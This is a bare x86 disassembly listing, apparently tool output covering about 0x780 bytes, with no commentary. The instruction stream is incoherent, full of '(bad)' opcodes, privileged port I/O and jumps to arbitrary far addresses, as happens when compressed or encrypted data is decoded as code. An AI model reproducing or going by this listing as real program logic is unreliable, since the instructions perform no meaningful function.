  40b88a:	sbb    esi,ecx
  40b88c:	mov    edx,0x53459de0
  40b891:	loope  0x40b88d
  40b893:	xor    BYTE PTR [edi],bl
  40b895:	jge    0x40b8d3
  40b897:	add    ebp,DWORD PTR [edi+0x750e3ed0]
  40b89d:	repnz sub DWORD PTR [ebp+0x61ecca33],0x16
  40b8a5:	mov    ds:0xd0b45f56,al
  40b8aa:	fld    TBYTE PTR [ebp-0x2919d119]
  40b8b0:	jge    0x40b84a
  40b8b2:	or     edx,eax
  40b8b4:	lgs    esi,FWORD PTR [esi-0x55]
  40b8b8:	mov    al,ds:0x5b15a16
  40b8bd:	or     eax,0x55cb4d44
  40b8c2:	xadd   BYTE PTR [edi],bl
  40b8c5:	imul   esi,DWORD PTR [edi-0x44bba2d8],0xc6d9b8b7
  40b8cf:	(bad)  
  40b8d0:	lock (bad) 
  40b8d2:	and    ebp,DWORD PTR [esi+eiz*1-0x48ea6637]
  40b8d9:	xchg   esi,eax
  40b8da:	pop    edx
  40b8db:	cld    
  40b8dc:	jmp    0xe466fa92
  40b8e1:	sahf   
  40b8e2:	and    al,0xe7
  40b8e4:	and    al,0x3f
  40b8e6:	sbb    ecx,DWORD PTR [esi-0x1d58412c]
  40b8ec:	adc    eax,DWORD PTR [edi+0x4]
  40b8ef:	mov    cl,0x77
  40b8f1:	(bad)  
  40b8f2:	cmc    
  40b8f3:	fst    DWORD PTR [eax]
  40b8f5:	scas   eax,DWORD PTR es:[edi]
  40b8f6:	push   eax
  40b8f7:	jle    0x40b91e
  40b8f9:	cmp    eax,0x92180e3f
  40b8fe:	and    al,0x74
  40b900:	add    dl,dh
  40b902:	neg    DWORD PTR [ecx]
  40b904:	sbb    eax,0xa733f014
  40b909:	shr    BYTE PTR [ecx+0x2b],0xcd
  40b90d:	mov    al,0xa2
  40b90f:	dec    ebx
  40b910:	cmp    ah,ch
  40b912:	mov    cl,0x81
  40b914:	out    0x4f,al
  40b916:	push   ebx
  40b917:	jmp    FWORD PTR [edi]
  40b919:	mov    edi,ss
  40b91b:	popa   
  40b91c:	sub    bl,BYTE PTR [edi-0x4fb85fb5]
  40b922:	xor    dl,bl
  40b924:	inc    esp
  40b925:	in     al,0x8e
  40b927:	xchg   edx,eax
  40b928:	mov    ecx,0xbe821960
  40b92d:	out    dx,eax
  40b92e:	dec    ebp
  40b92f:	aas    
  40b930:	dec    esp
  40b931:	pushf  
  40b932:	push   ecx
  40b933:	mov    esp,0x5fa19a3f
  40b938:	mov    edx,ebp
  40b93a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b93b:	inc    esi
  40b93c:	add    esi,ecx
  40b93e:	mov    esi,0x33d12087
  40b943:	and    DWORD PTR [ebx-0x14ece3c0],esi
  40b949:	pop    edx
  40b94a:	sbb    cl,BYTE PTR [ebp+ebx*4+0x59]
  40b94e:	ins    DWORD PTR es:[edi],dx
  40b94f:	xlat   BYTE PTR ds:[ebx]
  40b950:	xchg   edx,eax
  40b951:	jns    0x40b9c9
  40b953:	jecxz  0x40b91c
  40b955:	rcr    BYTE PTR [edi+0x32bebb80],0xe
  40b95c:	lock daa 
  40b95e:	push   esp
  40b95f:	mov    al,ds:0xee569ccc
  40b964:	mov    eax,0xcbe85c37
  40b969:	mov    cl,BYTE PTR [ebx+0x4]
  40b96c:	in     al,dx
  40b96d:	(bad)  
  40b96e:	fld    DWORD PTR [ebx+0x6b7608a8]
  40b974:	dec    edi
  40b975:	push   edi
  40b976:	outs   dx,DWORD PTR ds:[esi]
  40b977:	les    ebx,FWORD PTR [ecx-0x66c95a93]
  40b97d:	fsubr  QWORD PTR [ebx+eax*1]
  40b980:	add    bl,bl
  40b982:	xchg   DWORD PTR [edx-0x499348de],edx
  40b988:	jp     0x40b9de
  40b98a:	xor    eax,0xdcf1fa73
  40b98f:	aad    0xfc
  40b991:	fld    QWORD PTR [ebx-0x622dc7a]
  40b997:	jbe    0x40b9d8
  40b999:	inc    edx
  40b99a:	sbb    BYTE PTR [esi+0x39211e00],0xaa
  40b9a1:	push   0xffffffc6
  40b9a3:	in     al,0xed
  40b9a5:	jbe    0x40b983
  40b9a7:	je     0x40b989
  40b9a9:	mov    dh,0x8d
  40b9ab:	loop   0x40b9c8
  40b9ad:	dec    esp
  40b9ae:	jb     0x40b9a9
  40b9b0:	cmp    ah,BYTE PTR [edx-0x611f119d]
  40b9b6:	stos   DWORD PTR es:[edi],eax
  40b9b7:	mov    ecx,0xa5fc544c
  40b9bc:	fcomip st,st(6)
  40b9bf:	mov    ebp,0xb44442e8
  40b9c4:	mov    ah,0x36
  40b9c6:	inc    BYTE PTR [edx-0x7f260d10]
  40b9cc:	mov    ebp,0x3df703dc
  40b9d1:	fild   QWORD PTR [ecx+0x31]
  40b9d4:	jnp    0x40b9cd
  40b9d6:	adc    DWORD PTR [edi],0xc70951a4
  40b9dc:	ins    DWORD PTR es:[edi],dx
  40b9dd:	cdq    
  40b9de:	test   BYTE PTR [edx],dl
  40b9e0:	or     al,0x2a
  40b9e2:	bts    DWORD PTR [edi+0x41],edi
  40b9e6:	push   ss
  40b9e7:	rcl    cx,1
  40b9ea:	mov    ch,0x76
  40b9ec:	test   eax,0x1c4955d1
  40b9f1:	mov    esp,DWORD PTR [edx+0x406265f8]
  40b9f7:	dec    ebx
  40b9f8:	add    DWORD PTR [ebp-0x80],ebx
  40b9fb:	jnp    0x40b9db
  40b9fd:	mov    ds:0xdff9e8e1,al
  40ba02:	dec    esi
  40ba03:	pshufw mm0,mm7,0x67
  40ba07:	pop    edi
  40ba08:	retf   0x9fe
  40ba0b:	jp     0x40ba13
  40ba0d:	cli    
  40ba0e:	call   0xf1c6c882
  40ba13:	push   ebx
  40ba14:	xchg   BYTE PTR [edi-0x69],dh
  40ba17:	and    eax,0x4fa51554
  40ba1c:	test   al,0x7e
  40ba1e:	pop    ss
  40ba1f:	add    BYTE PTR [edx+edx*4-0xc],ch
  40ba23:	(bad)  
  40ba24:	in     al,dx
  40ba25:	and    BYTE PTR [edi],dh
  40ba27:	dec    esi
  40ba28:	jp     0x40b9bb
  40ba2a:	jb     0x40b9eb
  40ba2c:	and    esi,DWORD PTR [edi-0x3a]
  40ba2f:	out    0x74,eax
  40ba31:	cmp    BYTE PTR [ecx],bh
  40ba33:	fsubp  st(3),st
  40ba35:	jmp    0x40ba05
  40ba37:	jle    0x40ba61
  40ba39:	sub    ch,ch
  40ba3b:	stos   BYTE PTR es:[edi],al
  40ba3c:	stc    
  40ba3d:	ins    DWORD PTR es:[edi],dx
  40ba3e:	pusha  
  40ba3f:	icebp  
  40ba40:	push   esp
  40ba41:	jmp    0x88:0xee3690bf
  40ba48:	or     BYTE PTR [edi+0x4c],0x93
  40ba4c:	pop    eax
  40ba4d:	rcr    DWORD PTR [edi-0x4cd71ccd],0x28
  40ba54:	jp     0x40ba07
  40ba56:	rcl    DWORD PTR [eax+0x5c],0x75
  40ba5a:	push   0x73
  40ba5c:	test   al,0x19
  40ba5e:	div    ch
  40ba60:	(bad)  
  40ba61:	nop
  40ba62:	rol    DWORD PTR [eax+ebp*1],cl
  40ba65:	in     eax,0xc3
  40ba67:	vpavgb ymm0,ymm7,YMMWORD PTR [edx-0x4d]
  40ba6c:	aaa    
  40ba6d:	aaa    
  40ba6e:	jnp    0x40bacb
  40ba70:	sub    BYTE PTR ds:0x7e000b8d,dl
  40ba76:	je     0x40baba
  40ba78:	mov    ch,BYTE PTR [edx-0x73]
  40ba7b:	mov    al,0x44
  40ba7d:	add    al,0xaa
  40ba7f:	cmove  edx,ebp
  40ba82:	jmp    0x1d7c:0xde76a326
  40ba89:	scas   al,BYTE PTR es:[edi]
  40ba8a:	pop    ebp
  40ba8b:	(bad)  
  40ba8c:	jae    0x40ba10
  40ba8e:	into   
  40ba8f:	fld    QWORD PTR [edx]
  40ba91:	ins    BYTE PTR es:[edi],dx
  40ba92:	cmp    bl,ah
  40ba94:	push   ss
  40ba95:	push   esi
  40ba96:	cdq    
  40ba97:	jbe    0x40ba43
  40ba99:	mov    eax,ds:0x8c62f460
  40ba9e:	repz daa 
  40baa0:	sbb    esi,DWORD PTR [ebx]
  40baa2:	ret    
  40baa3:	cs sahf 
  40baa5:	or     DWORD PTR [esi-0x18],esi
  40baa8:	sbb    al,0x10
  40baaa:	pop    eax
  40baab:	mov    ah,0x6d
  40baad:	mov    al,ds:0xcff19280
  40bab2:	add    ebp,ebx
  40bab4:	fnstenv [edx+eax*2+0x3bedb023]
  40babb:	clc    
  40babc:	xor    al,0xbd
  40babe:	or     cl,bl
  40bac0:	mov    ebx,0x7acf7d14
  40bac5:	jbe    0x40baec
  40bac7:	int3   
  40bac8:	push   cs
  40bac9:	mov    ds:0xa11732db,al
  40bace:	out    0xd1,eax
  40bad0:	ret    
  40bad1:	mov    DWORD PTR [edx+0x67],edi
  40bad4:	(bad)  
  40bad5:	cdq    
  40bad6:	(bad)  
  40bad8:	jecxz  0x40bb42
  40bada:	adc    eax,0x123017d5
  40badf:	js     0x40bac2
  40bae1:	push   0x39
  40bae3:	and    BYTE PTR [ecx],cl
  40bae5:	pop    ecx
  40bae6:	push   0xcca5e4b1
  40baeb:	stos   BYTE PTR es:[edi],al
  40baec:	push   ebp
  40baed:	push   0xeb0434de
  40baf2:	in     al,0xdd
  40baf4:	mov    BYTE PTR ds:0x48dea2fa,al
  40bafa:	repz push edx
  40bafc:	ja     0x40ba89
  40bafe:	inc    esp
  40baff:	dec    edi
  40bb00:	jb     0x40bab7
  40bb02:	inc    edi
  40bb03:	sub    DWORD PTR [esi-0x3b4baf0e],eax
  40bb09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb0a:	dec    edx
  40bb0b:	adc    DWORD PTR [ebp-0x3a],0x1c
  40bb0f:	and    DWORD PTR [eax],ebx
  40bb11:	mov    ds:0xce45ce81,eax
  40bb16:	retf   
  40bb17:	pusha  
  40bb18:	xchg   ebp,ebp
  40bb1a:	xor    BYTE PTR [eax+0x17cd9c44],ah
  40bb20:	jne    0x40bb3c
  40bb22:	jmp    0x40bb56
  40bb24:	cmp    DWORD PTR [ecx-0x20],edi
  40bb27:	loopne 0x40bb73
  40bb29:	pop    edi
  40bb2a:	hlt    
  40bb2b:	adc    eax,0x86637d
  40bb30:	mov    esi,0x71794f38
  40bb35:	shl    DWORD PTR [edx+0x37],0xfd
  40bb39:	out    dx,al
  40bb3a:	mov    edx,0xd1ee9f30
  40bb3f:	xchg   edx,eax
  40bb41:	mov    dh,0xc9
  40bb43:	cdq    
  40bb44:	push   edx
  40bb45:	fwait
  40bb46:	and    eax,0x98b08819
  40bb4b:	clc    
  40bb4c:	mov    al,0xdf
  40bb4e:	out    0x6,al
  40bb50:	sub    al,0x28
  40bb52:	arpl   WORD PTR [eax+ebp*1+0x78],cx
  40bb56:	jg     0x40bb92
  40bb58:	jb     0x40bb25
  40bb5a:	rep ins DWORD PTR es:[edi],dx
  40bb5c:	std    
  40bb5d:	mov    ebx,DWORD PTR [eax]
  40bb5f:	xchg   esi,eax
  40bb60:	mov    ds:0xfffd424d,al
  40bb65:	mov    eax,ds:0x3f3c1c86
  40bb6a:	or     al,0x81
  40bb6c:	jne    0x40bb77
  40bb6e:	loopne 0x40bb99
  40bb70:	pushf  
  40bb71:	ds push esi
  40bb73:	addr16 (bad) 
  40bb75:	xor    DWORD PTR [edx+0x778971df],esp
  40bb7b:	inc    edx
  40bb7c:	aam    0x8c
  40bb7e:	xchg   esi,eax
  40bb7f:	cmp    DWORD PTR [esi+0x72],ebp
  40bb82:	aad    0x80
  40bb84:	wbinvd 
  40bb86:	repnz mov ch,0x76
  40bb89:	cli    
  40bb8a:	cmp    dh,ah
  40bb8c:	(bad)  
  40bb8d:	test   eax,0xe5248963
  40bb92:	sbb    BYTE PTR [edx+0x6daada73],bl
  40bb98:	les    esi,FWORD PTR [eax-0x52be2104]
  40bb9e:	lock xor BYTE PTR [ebx],cl
  40bba1:	je     0x40bb32
  40bba3:	or     eax,ecx
  40bba5:	leave  
  40bba6:	cmp    DWORD PTR [edx+0x17],edx
  40bba9:	inc    ebp
  40bbaa:	aas    
  40bbab:	out    dx,eax
  40bbac:	(bad)  
  40bbad:	stos   DWORD PTR es:[edi],eax
  40bbae:	mov    ecx,0xb82381a5
  40bbb3:	outs   dx,DWORD PTR ds:[esi]
  40bbb4:	adc    eax,DWORD PTR [edi]
  40bbb6:	xchg   DWORD PTR [esi],ecx
  40bbb8:	pop    ebp
  40bbb9:	ficom  DWORD PTR [edi+0x39]
  40bbbc:	test   BYTE PTR [edx-0x65],bh
  40bbbf:	pop    eax
  40bbc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbc1:	gs dec esp
  40bbc3:	adc    ah,BYTE PTR [edi]
  40bbc5:	mov    ebp,0x38e1f638
  40bbca:	lock inc edx
  40bbcc:	sti    
  40bbcd:	out    0x47,al
  40bbcf:	frstor [edi]
  40bbd1:	loope  0x40bb7b
  40bbd3:	into   
  40bbd4:	ret    0xf7a3
  40bbd7:	mov    edx,DWORD PTR [esp-0x58]
  40bbdb:	cmp    eax,0xfbddb4c1
  40bbe0:	fiadd  DWORD PTR [ebx+0x7c256165]
  40bbe6:	es stos DWORD PTR es:[edi],eax
  40bbe8:	push   ss
  40bbe9:	pushf  
  40bbea:	popa   
  40bbeb:	dec    eax
  40bbec:	jbe    0x40bbda
  40bbee:	call   0x8ddf6f96
  40bbf3:	sub    al,0xa6
  40bbf5:	ror    BYTE PTR [ebx+0x1f],0x1e
  40bbf9:	jns    0x40bba1
  40bbfb:	push   ebx
  40bbfc:	xchg   esp,eax
  40bbfd:	repz pushf 
  40bbff:	test   DWORD PTR [esi],esp
  40bc01:	sbb    eax,0x7396c091
  40bc06:	sub    al,BYTE PTR [esi]
  40bc08:	jns    0x40bc54
  40bc0a:	sbb    BYTE PTR [edx+eax*4-0x5d],ch
  40bc0e:	mov    ah,0xeb
  40bc10:	ins    DWORD PTR es:[edi],dx
  40bc11:	cmc    
  40bc12:	dec    eax
  40bc13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc14:	mov    ah,BYTE PTR [ecx+0x31]
  40bc17:	lods   eax,DWORD PTR ds:[esi]
  40bc18:	and    bl,BYTE PTR [edi-0x34]
  40bc1b:	imul   ebx,DWORD PTR [edi+0x29],0x5f3b1b0e
  40bc22:	cld    
  40bc23:	adc    al,0x21
  40bc25:	mov    ds:0x6c69802a,eax
  40bc2a:	pushf  
  40bc2b:	sar    BYTE PTR [edx+0xd83e7e5],0x56
  40bc32:	addr16 das 
  40bc34:	mov    eax,0xf075352e
  40bc39:	scas   al,BYTE PTR es:[edi]
  40bc3a:	sar    DWORD PTR [eax+eiz*4-0x74],0x53
  40bc3f:	sets   BYTE PTR [ebx+eiz*1-0x9]
  40bc44:	icebp  
  40bc45:	fstp   DWORD PTR [esi+eiz*8-0x1f]
  40bc49:	push   eax
  40bc4a:	fisttp QWORD PTR [esi-0xa]
  40bc4d:	cmp    ecx,esp
  40bc4f:	pop    edi
  40bc50:	jno    0x40bccf
  40bc52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc53:	inc    edx
  40bc54:	mov    dh,0xed
  40bc56:	fsub   st,st(5)
  40bc58:	mov    ebp,0xec784d97
  40bc5d:	repnz mov cl,0xc6
  40bc60:	jle    0x40bbf2
  40bc62:	rol    DWORD PTR [edx+0x78d4d425],1
  40bc68:	nop
  40bc69:	aaa    
  40bc6a:	or     esi,DWORD PTR [esi]
  40bc6c:	xor    cl,BYTE PTR [ebx+0x6e]
  40bc6f:	mov    DWORD PTR [esi],esi
  40bc71:	xor    eax,DWORD PTR ds:0x48b7585e
  40bc77:	imul   edx,DWORD PTR [edi],0xffffffbc
  40bc7a:	loope  0x40bc29
  40bc7c:	or     bh,BYTE PTR [ebp+0x41]
  40bc7f:	stos   BYTE PTR es:[edi],al
  40bc80:	mov    esi,0xfb84ea41
  40bc85:	stos   BYTE PTR es:[edi],al
  40bc86:	xchg   edi,eax
  40bc87:	jo     0x40bc35
  40bc89:	dec    eax
  40bc8a:	xchg   esi,eax
  40bc8b:	add    BYTE PTR [edx+0x1c9ce9b6],dl
  40bc91:	sub    al,0x31
  40bc93:	scas   al,BYTE PTR es:[edi]
  40bc94:	aam    0x98
  40bc96:	cmp    eax,0xe9642934
  40bc9b:	dec    esi
  40bc9c:	loop   0x40bc49
  40bc9e:	pop    esp
  40bc9f:	sub    ecx,edi
  40bca1:	mov    ebp,0x21fac054
  40bca6:	lock mov ch,0xdf
  40bca9:	adc    DWORD PTR [ebp-0x2],0xffffff8a
  40bcad:	cdq    
  40bcae:	xor    eax,DWORD PTR [ebx+0x262f3806]
  40bcb4:	fwait
  40bcb5:	sbb    al,0xaf
  40bcb7:	push   ecx
  40bcb8:	cmp    al,BYTE PTR [ecx-0x6694c342]
  40bcbe:	repz add ebx,DWORD PTR [eax-0x49]
  40bcc2:	push   ebx
  40bcc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcc4:	push   0x59598e53
  40bcc9:	loope  0x40bd0b
  40bccb:	lahf   
  40bccc:	int    0xd5
  40bcce:	fwait
  40bccf:	fwait
  40bcd0:	(bad)  
  40bcd1:	and    eax,0x68196929
  40bcd6:	loop   0x40bcda
  40bcd8:	aam    0xce
  40bcda:	pushf  
  40bcdb:	xchg   esi,eax
  40bcdc:	in     al,0x37
  40bcde:	xchg   ebp,eax
  40bcdf:	mov    edi,0x4787b22e
  40bce4:	(bad)  
  40bce5:	daa    
  40bce6:	(bad)  
  40bce7:	sbb    BYTE PTR gs:[ecx-0x6babfc8d],dl
  40bcee:	inc    esp
  40bcef:	mov    dh,0xf1
  40bcf1:	aad    0x25
  40bcf3:	xchg   esp,eax
  40bcf4:	in     eax,0xeb
  40bcf6:	cmc    
  40bcf7:	in     al,0x99
  40bcf9:	mov    esp,0x84785b61
  40bcfe:	xor    DWORD PTR [edi+0x64],eax
  40bd01:	mov    al,ds:0xf8b78d54
  40bd06:	inc    esp
  40bd07:	mov    ds:0xe72d64c0,al
  40bd0c:	fisub  WORD PTR [ebx-0x36bd0e3b]
  40bd12:	mov    ecx,0x51a492a
  40bd17:	sti    
  40bd18:	scas   al,BYTE PTR es:[edi]
  40bd19:	scas   eax,DWORD PTR es:[edi]
  40bd1a:	loopne 0x40bce0
  40bd1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd1d:	scas   al,BYTE PTR es:[edi]
  40bd1e:	(bad)  
  40bd20:	jnp    0x40bcc6
  40bd22:	push   edi
  40bd23:	or     ebx,ecx
  40bd25:	xor    BYTE PTR [ecx+0x1b633ad7],ch
  40bd2b:	fdivr  QWORD PTR [edx]
  40bd2d:	and    al,0x8b
  40bd2f:	shl    esp,0x30
  40bd32:	inc    ebx
  40bd33:	sbb    BYTE PTR [ebx-0x68],al
  40bd36:	dec    ebp
  40bd37:	fcomi  st,st(6)
  40bd39:	outs   dx,BYTE PTR ds:[esi]
  40bd3a:	jecxz  0x40bd97
  40bd3c:	mov    esp,0x8554d62a
  40bd41:	iret   
  40bd42:	inc    esp
  40bd43:	mov    al,BYTE PTR [edx+0x657650a7]
  40bd49:	loop   0x40bd14
  40bd4b:	cmp    bh,BYTE PTR [edi+0xd2d3486]
  40bd51:	test   bh,dl
  40bd53:	dec    esp
  40bd54:	in     al,dx
  40bd55:	fadd   st(4),st
  40bd57:	cmp    al,ch
  40bd59:	pop    esi
  40bd5a:	nop
  40bd5b:	jae    0x40bdb5
  40bd5d:	jle    0x40bd43
  40bd5f:	lds    ecx,FWORD PTR [edx-0x14]
  40bd62:	sbb    eax,0x828a4ecf
  40bd67:	jne    0x40bd65
  40bd69:	(bad)  
  40bd6a:	sbb    dl,BYTE PTR [ebx+edx*1-0x34]
  40bd6e:	int3   
  40bd6f:	mov    es,WORD PTR [ecx]
  40bd71:	arpl   bx,ax
  40bd73:	ret    0x434
  40bd76:	push   ss
  40bd77:	dec    eax
  40bd78:	xchg   ebp,eax
  40bd79:	pop    edi
  40bd7a:	xchg   ebp,eax
  40bd7b:	inc    ebx
  40bd7c:	lods   al,BYTE PTR ds:[esi]
  40bd7d:	aaa    
  40bd7e:	lds    ecx,FWORD PTR [esi-0x3a]
  40bd81:	stc    
  40bd82:	out    0x11,eax
  40bd84:	call   0xb51d1c0c
  40bd89:	cwde   
  40bd8a:	and    al,0x3c
  40bd8c:	lea    esp,[ebp+eax*2+0x70]
  40bd90:	mov    esi,DWORD PTR [ebx]
  40bd92:	inc    ebx
  40bd93:	test   eax,0x7951e50c
  40bd98:	jno    0x40bd3a
  40bd9a:	add    eax,0x41b540d2
  40bd9f:	(bad)  
  40bda1:	ins    BYTE PTR es:[edi],dx
  40bda2:	bound  esi,QWORD PTR [ebx-0x63580fbd]
  40bda8:	lea    ecx,[eax]
  40bdaa:	mov    esp,0x33d07122
  40bdaf:	mov    bh,0xf4
  40bdb1:	mov    WORD PTR [ebx-0x7816291f],?
  40bdb7:	shr    DWORD PTR [edi+0x69],1
  40bdba:	jg     0x40bd6c
  40bdbc:	gs retf 0x2749
  40bdc0:	popf   
  40bdc1:	fistp  WORD PTR [esi]
  40bdc3:	mov    al,ds:0x8ef898ee
  40bdc8:	mov    esi,0xc84218c9
  40bdcd:	xchg   ecx,eax
  40bdce:	jecxz  0x40be3a
  40bdd0:	pop    edi
  40bdd1:	sti    
  40bdd2:	test   ecx,ebp
  40bdd4:	je     0x40be19
  40bdd6:	mov    ebx,0xd0a625e8
  40bddb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bddc:	mov    bh,0x7d
  40bdde:	mov    edi,0x255c2878
  40bde3:	je     0x40bde5
  40bde5:	in     eax,0x1f
  40bde7:	mov    eax,0x327874ad
  40bdec:	sbb    DWORD PTR [edx+0xd],ebx
  40bdef:	sbb    BYTE PTR [esi],dl
  40bdf1:	fiadd  WORD PTR [edx+0x210a4e41]
  40bdf7:	jne    0x40be4c
  40bdf9:	fcmovb st,st(1)
  40bdfb:	ss out 0x1a,al
  40bdfe:	or     BYTE PTR [edx-0x3e],cl
  40be01:	or     eax,0x68f66b4c
  40be06:	pop    edi
  40be07:	ins    BYTE PTR es:[edi],dx
  40be08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be09:	das    
  40be0a:	imul   ebx,DWORD PTR [ecx+0x21a7070],0xdda05735
  40be14:	sbb    cl,BYTE PTR [edx]
  40be16:	pop    es
  40be17:	mov    bl,0x36
  40be19:	jg     0x40bdb1
  40be1b:	adc    BYTE PTR [ebx-0x655db6d],bh
  40be21:	xchg   edi,eax
  40be22:	pop    esi
  40be23:	sub    al,0x52
  40be25:	pop    eax
  40be26:	mov    ch,0xf3
  40be28:	movd   ebx,mm5
  40be2b:	mov    dl,0x2a
  40be2d:	outs   dx,BYTE PTR ds:[esi]
  40be2e:	xchg   esp,eax
  40be2f:	dec    DWORD PTR [eax-0x4e36e727]
  40be35:	sar    DWORD PTR [eax],1
  40be37:	outs   dx,BYTE PTR ds:[esi]
  40be38:	jmp    0x40be1c
  40be3a:	xor    DWORD PTR [ebx-0x64],edx
  40be3d:	sub    BYTE PTR [ebx+0xe1c023d],dl
  40be43:	(bad)  
  40be44:	(bad)  
  40be46:	pop    ebx
  40be47:	jge    0x40be76
  40be49:	(bad)  
  40be4a:	(bad)  
  40be4b:	icebp  
  40be4c:	call   0xa4c8:0x981be8ad
  40be53:	pop    ebx
  40be54:	inc    BYTE PTR [eax+0x12e9cd59]
  40be5a:	or     BYTE PTR [ebp-0x12],al
  40be5d:	or     eax,0x802d0a81
  40be62:	(bad)  
  40be64:	xor    eax,0xc516a1b4
  40be69:	daa    
  40be6a:	mov    ah,BYTE PTR [edx]
  40be6c:	sbb    edx,esp
  40be6e:	mov    cl,0x7f
  40be70:	lea    edi,[ecx-0x7b0012f7]
  40be76:	cmc    
  40be77:	and    al,0xbe
  40be79:	mov    dl,0xd8
  40be7b:	lods   eax,DWORD PTR ds:[esi]
  40be7c:	xor    eax,0xd2f65eea
  40be81:	icebp  
  40be82:	push   0xb40b5025
  40be87:	inc    edi
  40be88:	push   esi
  40be89:	lock daa 
  40be8b:	and    al,0x1c
  40be8d:	adc    al,0xf4
  40be8f:	les    esp,FWORD PTR [edx]
  40be91:	mov    ds:0x8ece70cb,al
  40be96:	fnsave fs:[eax]
  40be99:	jo     0x40be3f
  40be9b:	jo     0x40beb6
  40be9d:	stc    
  40be9e:	mov    DWORD PTR ss:[ebp+0xd0535cd],ecx
  40bea5:	ret    
  40bea6:	jmp    0x128bf82e
  40beab:	push   DWORD PTR [eax-0x1f253848]
  40beb1:	mov    esp,0x94daef2f
  40beb6:	call   0x7b282287
  40bebb:	fistp  WORD PTR [esi]
  40bebd:	cmp    ebx,esp
  40bebf:	mov    al,ds:0x3f6a38e
  40bec4:	add    ch,BYTE PTR [edi+0x61]
  40bec7:	push   0x3c
  40bec9:	and    BYTE PTR [ebp+eiz*2+0x69516bf7],cl
  40bed0:	mov    ebx,0xff167f81
  40bed5:	je     0x40bea7
  40bed7:	mov    DWORD PTR [ebx-0x30],ebp
  40beda:	mov    ebp,0x24bab3f0
  40bedf:	cmc    
  40bee0:	dec    ecx
  40bee1:	pop    ss
  40bee2:	lahf   
  40bee3:	cmp    BYTE PTR [ebx+0x3a97de56],cl
  40bee9:	xchg   DWORD PTR ds:0xf1e4b5a4,ebx
  40beef:	jmp    0x8c6d:0x7c2a25eb
  40bef6:	sub    BYTE PTR [esi+0x36],bl
  40bef9:	add    dl,BYTE PTR [esp+eiz*8+0x41ba1e88]
  40bf00:	adc    DWORD PTR [esi],ebx
  40bf02:	jmp    0xb4a3:0xe4f58195
  40bf09:	lods   eax,DWORD PTR ds:[esi]
  40bf0a:	xor    al,BYTE PTR [edi+0x6c]
  40bf0d:	sbb    BYTE PTR [ebx+0xb],bh
  40bf10:	push   esi
  40bf12:	sbb    ecx,DWORD PTR [ecx]
  40bf14:	fldenv [eax-0x44]
  40bf17:	(bad)  
  40bf18:	stc    
  40bf19:	icebp  
  40bf1a:	(bad)  
  40bf1b:	lds    eax,FWORD PTR [ecx-0x2c41a162]
  40bf21:	frstor [esi]
  40bf23:	test   eax,0xe523653d
  40bf28:	cmp    al,0xc7
  40bf2a:	jge    0x40bf43
  40bf2c:	pop    ebx
  40bf2d:	test   DWORD PTR ss:[edx],esp
  40bf30:	scas   eax,DWORD PTR es:[edi]
  40bf31:	cwde   
  40bf32:	ds sub al,0xcd
  40bf35:	mov    WORD PTR [esi+0x74],gs
  40bf38:	inc    edi
  40bf39:	leave  
  40bf3a:	je     0x40bf1c
  40bf3c:	call   0xa2c9:0xf05b23d9
  40bf43:	xchg   BYTE PTR [ebx],ch
  40bf45:	sbb    bh,BYTE PTR [eax]
  40bf47:	popf   
  40bf48:	xchg   esp,eax
  40bf49:	mov    esp,0x51d7857a
  40bf4e:	sti    
  40bf4f:	adc    BYTE PTR [ebx+0x5d07fde8],al
  40bf55:	out    dx,eax
  40bf56:	or     BYTE PTR [eax+eax*8-0x6ddb1075],al
  40bf5d:	sbb    al,0xb4
  40bf5f:	ins    DWORD PTR es:[edi],dx
  40bf60:	psubusw mm6,QWORD PTR [esi]
  40bf63:	xor    al,0xbd
  40bf65:	mov    esi,0x9cc46ff8
  40bf6a:	push   esi
  40bf6b:	mov    dh,0x4
  40bf6d:	adc    ebx,DWORD PTR [ebx+0x67]
  40bf70:	xchg   edx,eax
  40bf71:	ss xchg ecx,eax
  40bf73:	mov    ch,0xc9
  40bf75:	dec    edi
  40bf76:	jmp    0xbc4f8ed6
  40bf7b:	jmp    0x6f93:0xe9a049a6
  40bf82:	ss adc eax,0x1b5a68e6
  40bf88:	aam    0xe6
  40bf8a:	mov    ah,BYTE PTR [ebx-0x80]
  40bf8d:	(bad)  
  40bf8e:	loopne 0x40bfac
  40bf90:	aam    0x66
  40bf92:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40bf94:	add    BYTE PTR [esp+eiz*8-0x77],dh
  40bf98:	mov    al,ds:0xc4c76e66
  40bf9d:	dec    ecx
  40bf9e:	es inc edx
  40bfa0:	fbld   TBYTE PTR [eax]
  40bfa2:	outs   dx,BYTE PTR ds:[esi]
  40bfa3:	repnz les edi,FWORD PTR [ebx]
  40bfa6:	call   0x1a56ca02
  40bfab:	push   ebx
  40bfac:	rcl    DWORD PTR [ebx-0x43],cl
  40bfaf:	sbb    eax,0x54916f62
  40bfb4:	mov    al,ds:0xfe25ed0c
  40bfb9:	sub    ebp,DWORD PTR [bx+si-0x70]
  40bfbd:	push   0x2f506738
  40bfc2:	mov    ebp,ecx
  40bfc4:	push   es
  40bfc5:	add    ebp,0x9f825c12
  40bfcb:	jl     0x40c02f
  40bfcd:	adc    DWORD PTR [eax+0x795ed4d8],edi
  40bfd3:	xchg   esp,eax
  40bfd4:	sbb    DWORD PTR [edi-0x3b8d3dad],esi
  40bfda:	jmp    0xc439a823
  40bfdf:	jae    0x40c047
  40bfe1:	jmp    0x40bf66
  40bfe3:	scas   al,BYTE PTR es:[edi]
  40bfe4:	add    dl,BYTE PTR [ebx-0x19]
  40bfe7:	mov    ebp,0x3de754c5
  40bfec:	bound  edi,QWORD PTR [ebp-0x57]
  40bfef:	adc    BYTE PTR [ebp+0x15],al
  40bff2:	adc    al,0x45
  40bff4:	shl    dl,1
  40bff6:	pusha  
  40bff7:	outs   dx,DWORD PTR ds:[esi]
  40bff8:	add    al,0x86
  40bffa:	lods   eax,DWORD PTR ds:[esi]
  40bffb:	or     BYTE PTR [eax],dl
  40bffd:	xor    DWORD PTR [edi+0x1411ef50],0x42abd28f
